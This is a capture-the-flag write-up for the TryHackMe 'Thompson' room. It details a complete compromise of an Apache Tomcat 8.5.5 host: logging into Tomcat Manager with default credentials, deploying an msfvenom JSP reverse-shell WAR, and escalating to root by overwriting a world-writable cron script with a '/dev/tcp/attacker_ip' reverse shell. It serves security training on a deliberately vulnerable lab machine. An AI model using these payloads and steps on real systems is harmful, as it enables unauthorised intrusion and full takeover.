# Thompson

Room : https://tryhackme.com/room/bsidesgtthompson


# Reconnaissance

## Host Discovery

First, I verified that the target was reachable.

```bash
ping 10.49.138.137
```

The host responded successfully, confirming that the machine was online. 


## Port Scanning

I started with RustScan to quickly identify open ports.

```bash
rustscan -a 10.49.138.137
```

Results:

```text
22/tcp
8009/tcp
8080/tcp
```

To gather service information, I followed up with Nmap.

```bash
nmap -sC -sV -p22,8009,8080 10.49.138.137
```

Results:

```text
22/tcp   OpenSSH 7.2p2
8009/tcp Apache JServ Protocol (AJP)
8080/tcp Apache Tomcat 8.5.5
```

The presence of Tomcat immediately made the web service the primary attack surface. 


# Web Enumeration

## Directory Discovery

I enumerated the Tomcat web root using Gobuster.

```bash
gobuster dir \
-u http://10.49.138.137:8080 \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting findings:

```text
/docs
/examples
/host-manager
/manager
```

The `/manager` endpoint was especially interesting because Tomcat Manager often allows application deployment. 


# Tomcat Manager Access

Visiting:

```text
http://10.49.138.137:8080/manager
```

presented a login form.

After intentionally submitting invalid credentials, Tomcat returned a helpful error message explaining that credentials are stored in:

```text
conf/tomcat-users.xml
```

It even included an example configuration:

```xml
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

This strongly hinted that the manager credentials were:

```text
Username: tomcat
Password: s3cret
```

Using those credentials successfully authenticated me to the Tomcat Web Application Manager. 


# Initial Access

## Generating a WAR Reverse Shell

Since Tomcat deploys Java web applications packaged as WAR files, I generated a JSP reverse shell using `msfvenom`.

```bash
msfvenom \
-p java/jsp_shell_reverse_tcp \
LHOST=attacker_ip \
LPORT=4444 \
-f war \
-o shell.war
```

Output:

```text
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: shell.war
```


## Deploying the WAR File

Inside Tomcat Manager, I used the **WAR file to deploy** section and uploaded:

```text
shell.war
```

Before triggering it, I started a listener.

```bash
nc -lvnp 4444
```


## Triggering the Reverse Shell

After deployment, I clicked to the newly deployed application.

The listener immediately received a connection:

```text
Connection received on 10.49.138.137
```

Verifying access:

```bash
whoami
```

Output:

```text
tomcat
```

Initial access achieved. 


## Upgrading the Shell

To obtain a stable interactive shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a much more usable terminal session.


# User Flag

Enumerating the home directory:

```bash
cd /home
ls
```

revealed a user named:

```text
jack
```

Inside the directory:

```bash
cd /home/jack
ls
```

I found:

```text
user.txt
```

Reading the file:

```bash
cat user.txt
```

User flag obtained. 


# Privilege Escalation

## Checking Sudo

My first instinct was to check sudo permissions.

```bash
sudo -l
```

Unfortunately, sudo required a password that I did not know.

So I moved on to further enumeration. 


## Using pspy

To monitor processes running as root, I transferred `pspy64` to the target.

On the attacker machine:

```bash
python3 -m http.server 8888
```

On the target:

```bash
cd /tmp
wget http://192.168.144.17:8888/pspy64
chmod +x pspy64
./pspy64
```

The output did not immediately reveal anything useful. 


## Inspecting Cron Jobs

Next, I examined the system crontab.

```bash
cat /etc/crontab
```

Near the bottom I found:

```bash
* * * * * root cd /home/jack && bash id.sh
```

This meant that **every minute**, root executed:

```bash
/home/jack/id.sh
```

This looked very promising. 


## Examining the Script

Moving into Jack's home directory:

```bash
cd /home/jack
```

I inspected the script.

```bash
cat id.sh
```

Contents:

```bash
#!/bin/bash
id > test.txt
```

Nothing unusual there.

However, checking permissions revealed a serious issue:

```bash
ls -al
```

Output:

```text
-rwxrwxrwx 1 jack jack 26 Aug 14 2019 id.sh
```

The script was world-writable (`777`). 


# Exploiting the Cron Job

Since root executed `id.sh` every minute and the file was writable by everyone, I replaced its contents with a reverse shell.

```bash
echo 'bash -i >& /dev/tcp/attacker_ip/5555 0>&1' > /home/jack/id.sh
```

On my attack machine I started a listener:

```bash
nc -lvnp 5555
```

After waiting less than a minute, root executed the modified script.

Listener output:

```text
Connection received on 10.49.138.137
```

Verifying privileges:

```bash
whoami
```

Output:

```text
root
```

Privilege escalation successful. 


# Root Flag

Navigating to the root directory:

```bash
cd /root
ls
```

revealed:

```text
root.txt
```

Reading the flag:

```bash
cat root.txt
```


Root flag captured. 


